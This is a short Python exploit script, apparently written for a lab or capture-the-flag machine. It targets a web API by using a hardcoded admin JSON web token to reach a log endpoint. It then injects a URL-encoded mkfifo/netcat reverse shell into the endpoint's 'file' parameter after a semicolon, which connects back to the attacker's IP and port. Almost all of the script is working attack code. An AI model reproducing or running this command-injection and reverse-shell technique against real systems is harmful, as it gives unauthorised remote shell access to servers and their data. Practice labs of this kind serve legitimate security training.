import requests as req
from urllib.parse import quote

url = "http://10.10.11.120:3000"

def register(name, email, password):
    
    data = {
        "name": name,
        "email": email,
        "password": password
    }

    r = req.post(f"{url}/api/user/register", json=data)
    return r.text

def login(email, password):
    
    data = {
        "email": email,
        "password": password
    }

    r = req.post(f"{url}/api/user/login", json=data)
    return r.text

def accessPriv(auth_token):

    headers = {
        "auth-token": auth_token
    }

    r = req.get(f"{url}/api/priv", headers=headers)
    return r.text

def accessLogs(auth_token, file):

    headers = {
        "auth-token": auth_token
    }

    r = req.get(f"{url}/api/logs?file={file}", headers=headers)
    return r.text



#####

adminToken = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MTE0NjU0ZDc3ZjlhNTRlMDBmZTU3NzciLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InJvb3RAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjM2ODk2NDcwfQ.pL1uSQoRkocj-DnN-uvos9YbdFQd3gcu9PLu8tOBYas"

my_ip = "10.10.15.47"
my_port = "1234"
revshell = quote(f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {my_ip} {my_port} >/tmp/f")

print(accessLogs(adminToken, f";{revshell}"))
